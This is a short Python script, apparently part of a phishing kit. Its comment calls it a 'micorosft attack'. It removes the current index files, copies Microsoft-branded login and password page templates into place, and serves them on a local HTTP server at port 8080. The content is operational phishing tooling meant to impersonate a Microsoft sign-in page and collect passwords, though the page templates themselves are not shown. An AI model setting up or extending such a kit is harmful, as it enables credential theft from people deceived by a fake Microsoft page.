#command : use micorosft attack
import os
os.system("rm -f index.html")
os.system("rm -f index.js")
os.system("cp Microsoft/index.html ./")
os.system("cp Microsoft/index.js ./")
os.system("cp Microsoft/logo.png ./")
os.system("cp Microsoft/pass.png ./")
os.system("cp Microsoft/pass.html ./")
print("start the port 8080 on http://127.0.0.1 and http://localhost:8080")
os.system("python3 -m http.server 8080")